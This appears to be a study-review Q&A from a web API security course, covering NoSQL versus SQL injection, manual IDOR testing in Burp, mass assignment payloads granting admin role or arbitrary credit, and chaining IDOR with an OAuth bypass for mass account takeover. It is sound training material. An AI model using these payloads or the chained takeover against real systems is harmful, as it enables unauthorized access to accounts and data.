**Can you explain the difference between NoSQL injection and SQL injection at the technical level?**
SQL injection inserts SQL syntax characters into a string parameter to break out of a string literal and inject SQL commands. NoSQL injection (specifically MongoDB injection) inserts operator objects into a JSON parameter — instead of a string, you send `{"$gt": ""}`, which MongoDB interprets as a comparison operator rather than a literal value. The root cause is identical: user input is interpreted as query logic instead of data. The mechanism differs because MongoDB queries are JSON objects, not string-based query languages.

**Can you perform an IDOR test manually in Burp without any automated tools?**
Yes — find any endpoint with a resource ID in the path or query parameter, send it to Repeater, change the ID to another user's resource ID harvested from another API response, keep your own token, send the request. If data is returned for a resource you do not own, IDOR is confirmed.

**Can you describe two real-world scenarios where mass assignment would have critical impact?**
First: a user registration endpoint that accepts a `role` field — sending `{"email": "x@x.com", "password": "x", "role": "admin"}` creates an admin account. Second: a profile update endpoint that accepts an `available_credit` field — sending `{"name": "test", "available_credit": 99999}` sets the user's balance to an arbitrary value, enabling purchases without payment.

**Can you chain IDOR with another vulnerability and explain the combined impact?**
IDOR combined with the OAuth implicit flow bypass from Day 31: use IDOR to harvest victim email addresses from the vehicle location endpoint, then use those emails in a modified POST /authenticate request with a valid OAuth token to log in as each victim. IDOR provides the target email list; OAuth implicit flow bypass provides the login mechanism. Together they enable mass account takeover across all users whose vehicle IDs appear in community posts.

**Can you explain why using UUIDs instead of sequential integers does not fix IDOR?**
UUIDs are harder to guess because they are 128-bit random values rather than incrementing integers. But UUIDs appear in API responses, community posts, URLs, and shared links. Any UUID that is ever transmitted to any user can be harvested and used in an IDOR attack as demonstrated today — the victim's vehicle UUID was found in community post data. The fix for IDOR is server-side ownership verification, not obscuring the identifier.

---
